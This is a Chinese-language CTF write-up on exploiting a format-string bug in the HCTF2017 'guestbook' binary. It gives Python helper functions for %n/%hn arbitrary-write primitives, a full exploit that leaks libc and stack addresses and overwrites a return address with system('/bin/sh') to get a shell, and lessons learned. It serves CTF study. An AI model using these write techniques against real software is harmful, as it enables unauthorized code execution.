# 关于HCTF2017的guestbook的一点总结

一道很明显的格式化字符串漏洞的题目，然后我在如何利用这块想了很久，总结一下经验吧。。。

## 通过格式化字符串漏洞进行DWORD/WORD SHOOT

因为是格式化字符串漏洞，（很明显see那里有格式化字符串漏洞，）可以利用ebp chain进行dword shoot，具体实现代码如下：

```python
#pre: iDst and iNum is smaller than 0x7fffffff
#the next two gust index is 2 and 3
def dword_shoot(iDst, iNum, idx1, idx2):
	add_guest("%"+str(iDst)+"x%72$n", "1")
	add_guest("%"+str(iNum)+"x%80$n", "1")
	see_guest(idx1)
	see_guest(idx2)
	del_guest(idx1)
	del_guest(idx2)
#iNum < 0x7fffffff
def stack_shoot_dword(addr_72, displacement, iNum, idx1, idx2):
	addr = (addr_72 + displacement * 4) & 0xffff
	add_guest("%"+str(addr)+"x%72$hn", "1")
	add_guest("%"+str(iNum)+"x%80$n", "1")
	see_guest(idx1)
	see_guest(idx2)
	del_guest(idx1)
	del_guest(idx2)
#iNum < 0xffff
def stack_shoot_word(addr_72, displacement, iNum, idx1, idx2):
	addr = (addr_72 + displacement * 2) & 0xffff
	add_guest("%"+str(addr)+"x%72$hn", "1")
	add_guest("%"+str(iNum)+"x%80$hn", "1")
	see_guest(idx1)
	see_guest(idx2)
	del_guest(idx1)
	del_guest(idx2)
```

72\$指向80\$,所以第一步先把80$处的地址写为我们的目标地址，然后下一次用这个地址进行任意地址写入（dword shoot）

然后是stack dword shoot，这个就有点麻烦了，因为貌似写入超过0x7fffffff的数会写入失败snprintf返回-1,而栈的基址一般都是大于这个值的，但是，有一个叫做hn的操作：只写入一个word，所以我们可以利用ebp chain的值的高16位都是栈的基址这点(不准确吧，不过反正就是栈那块的地址)，只对80$处的低16位进行写入，所以可以向栈中高16位是ebp chain的高16位的那块区域写入任意数据。addr_72是通过%u获取的72的值，displacement是相对那个所获取出来的值的偏移，这个地方会被写入一个word或者dword。。。

但是有个前提，就是调用dword_shoot之后，80$处的数据会被污染(高16位被破坏)，所以stack_shoot就不再奏效。。。

## 本题解题思路

### GOT表覆盖

一开始我是想覆盖GOT表地址(free变成system)，把某个phone的指针(本来指向堆)变成指向.data段的"/bin/sh"，可以通过将name设置成"/bin/sh"来实现。但是这是e8的call，是通过相对偏移调用的，而不是GOT表，所以失败

### 比较麻烦的方法

这个方法比较麻烦，也与预期的方法不一样，但还是记录一下吧。

首先，目标是调用see_guest时，将返回地址写入成system的地址，并在返回地址+8处写入"/bin/sh"作为其第一个参数

然而system的地址也是大于0x7fffffff的，所以要分两部分来word shoot，刚好有两个格式化字符串漏洞，然而phone是限制只能是数字的，所以可以先把phone的指针设为指向另一个guest的name，这个name也是进行word shoot的payload。一个射高16位，一个射低16位，完成目标，返回时执行到system("/bin/sh")

然而，我们需要在栈中先放置 返回地址 和 返回地址+2 的值，这样才能通过%xx$hn进行shoot，所以要先把它们stack_shoot_word到栈中。（因为栈的地址大于0x7fffffff，所以要找个高16位是那块区域的地址，修改其低16位使其指向返回地址和返回地址+2）

还有就是，我们所shoot的位置里面的内容必须要保持不变，就是，因为要各种add see del，如果这些操作会改变我们shoot位置的值，就不能shoot那里。这个具体可以调试器手动改一下然后随便搞些操作看下会不会被修改。。。

具体实现代码如下：

```python
add_guest("/bin/sh\x00", "1") #index 0
add_guest("%1$u %72$u %3$u", "1") #index 1
szName = see_guest(1)
del_guest(1)
libc = get_libc_base(szName)
guestbook = get_guest_base(szName)
from_72 = get_stack_from_72(szName)
#获取各种基址
system_addr = libc + 0x03ada0 # given 0x0003a940，这个是我电脑上的，题目给的是注释里面那个。。。
guestStruct = guestbook+0x3040
phoneStruct = guestbook+0x3063
structSize = 0x28 # both struct are 0x28
# +1 is the pointer to the phone in the heap
# +4 is the array of the name
ret = from_72 - 7 * 4

add_guest("%"+str(system_addr>>16)+"x%87$hn", "1") # index 1
#correspond to 14 that is going to be return addr + 2
add_guest("%"+str(system_addr&0xffff)+"x%84$hn", "1") # index 2
#correspond to 8 that is going to be ret addr

stack_shoot_word(from_72, 8, (ret) & 0xffff, 3, 4)
stack_shoot_word(from_72, 14, (ret + 2) & 0xffff, 3, 4)
#change 8 14 into the ret addr and ret addr+2

stack_shoot_dword(from_72, -5, guestStruct+4, 3, 4)
#shoot addr of "/bin/sh" into the position that is going to be the first argument

dword_shoot(phoneStruct+structSize+1, guestStruct+structSize*2+4, 3, 4)
#shoot shoot the index 1 phone as name of index 2

# see 1,然后覆盖返回地址为system，执行system("/bin/sh")
sh.send("2")
sh.recvuntil("input the guest index:\n")
sh.send(str(1))

sh.interactive()

```

## 经验总结

1. 一开始有个地方(del_guest)我用了recv而不是recvuntil，导致了有时成功有时失败。其实这是流的粘包与否的不确定性所造的孽。。。比方说，还没收完puts出来的字符串，就sh.recv()返回了。。。然后send再recv()把刚才的收完，再send，这个时候就会出错。。。（自己脑补一下吧。。。）
2. 面对这种比较复杂的exploit方法，还是多模块化封装比较好。。。不然会晕。。。
3. 其实想了另外一种exploit方法，就是stack_shoot_dword所存储的ebp，使得函数返回后，ebp被劫持，然后这里如果再通过[ebp-xxx]访问局部变量的话，会访问到我们指定的地址。。。比方说mov [ebp-0x10],xxx，如果这个xxx我们可以控制，ebp也能通过格式化字符串漏洞控制，那么就也能造成一个dword shoot。。。

